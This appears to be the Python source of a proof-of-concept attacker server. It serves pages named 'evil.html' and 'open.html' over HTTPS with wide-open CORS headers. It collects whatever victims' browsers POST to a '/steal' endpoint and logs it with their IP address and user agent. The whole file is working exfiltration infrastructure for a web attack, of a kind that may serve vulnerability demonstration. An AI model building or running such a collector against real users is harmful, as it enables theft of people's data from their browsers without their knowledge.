import http.server, ssl, os, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
PAGE = os.path.join(HERE, "evil.html")
LOG  = os.path.join(HERE, "poc_steal.log")
PORT = 2053
CERT = os.path.join(HERE, "server.crt")
KEY  = os.path.join(HERE, "server.key")


class H(http.server.BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def do_OPTIONS(self):
        self.send_response(204); self._cors(); self.end_headers()

    def do_GET(self):
        route = {"/": "evil.html", "/evil.html": "evil.html", "/open.html": "open.html"}
        name = route.get(self.path)
        if not name:
            self.send_response(404); self._cors(); self.end_headers(); return
        with open(os.path.join(HERE, name), "rb") as f:
            body = f.read()
        self.send_response(200)
        self._cors()
        self.send_header("Content-Type", "text/html;charset=UTF-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        if self.path != "/steal":
            self.send_response(404); self._cors(); self.end_headers(); return
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else b""
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{ts}] from={self.client_address[0]} ua={self.headers.get('User-Agent','?')}\n{body.decode('utf-8','replace')}\n---\n"
        with open(LOG, "a") as f: f.write(line)
        sys.stdout.write("\n" + line); sys.stdout.flush()
        self.send_response(200); self._cors()
        self.send_header("Content-Type", "text/plain")
        self.end_headers(); self.wfile.write(b"ok")

    def log_message(self, fmt, *a):
        sys.stdout.write("[%s] %s\n" % (self.log_date_time_string(), fmt % a))
        sys.stdout.flush()


def main():
    httpd = http.server.ThreadingHTTPServer(("0.0.0.0", PORT), H)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=CERT, keyfile=KEY)
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    print(f"[+] HTTPS listening on 0.0.0.0:{PORT}")
    print(f"[+] page={PAGE} log={LOG}")
    httpd.serve_forever()


if __name__ == "__main__":
    main()
